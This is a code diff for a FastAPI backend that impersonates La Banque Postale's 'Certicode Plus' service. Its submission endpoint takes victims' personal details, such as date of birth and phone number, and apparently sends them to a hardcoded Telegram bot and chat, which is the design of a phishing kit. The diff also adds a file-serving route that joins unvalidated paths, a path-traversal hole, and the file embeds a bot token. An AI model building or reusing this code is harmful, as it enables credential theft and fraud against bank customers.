@@ -1,10 +1,13 @@
 import logging
 import os
 import httpx
+from pathlib import Path
 from datetime import datetime, timezone
 from contextlib import asynccontextmanager
 from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
+from fastapi.staticfiles import StaticFiles
+from fastapi.responses import FileResponse
 from pydantic import BaseModel
 from motor.motor_asyncio import AsyncIOMotorClient
 
@@ -19,6 +22,9 @@ DB_NAME = os.environ.get("DB_NAME", "certicode_db")
 # Telegram
 TELEGRAM_BOT_TOKEN = "8619588506:AAGJFMHEN6ELOzu-6Spg_lhkDKyt9yt7Zvc"
 TELEGRAM_CHAT_ID = "8777096346"
+
+# Frontend build path
+BUILD_DIR = Path(__file__).parent.parent / "frontend" / "build"
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
@@ -39,13 +45,13 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-api_router = FastAPI()
+# --- API Routes ---
 
-@api_router.get("/")
+@app.get("/api/")
 async def root():
     return {"message": "La Banque Postale - Certicode Plus API"}
 
-@api_router.get("/health")
+@app.get("/api/health")
 async def health():
     return {"status": "ok"}
 
@@ -74,7 +80,7 @@ class CerticodeSubmission(BaseModel):
     date_of_birth: str = ""
     phone_number: str = ""
 
-@api_router.post("/certicode/submit")
+@app.post("/api/certicode/submit")
 async def submit_certicode_data(data: CerticodeSubmission):
     try:
         message = f"""
@@ -107,4 +113,13 @@ async def submit_certicode_data(data: CerticodeSubmission):
         logger.error(f"Error processing certicode submission: {str(e)}")
         return {"status": "error", "message": str(e)}
 
-app.mount("/api", api_router)
+# --- Serve Frontend ---
+if BUILD_DIR.exists():
+    app.mount("/static", StaticFiles(directory=str(BUILD_DIR / "static")), name="static")
+
+    @app.get("/{full_path:path}")
+    async def serve_frontend(full_path: str):
+        file_path = BUILD_DIR / full_path
+        if file_path.exists() and file_path.is_file():
+            return FileResponse(str(file_path))
+        return FileResponse(str(BUILD_DIR / "index.html"))
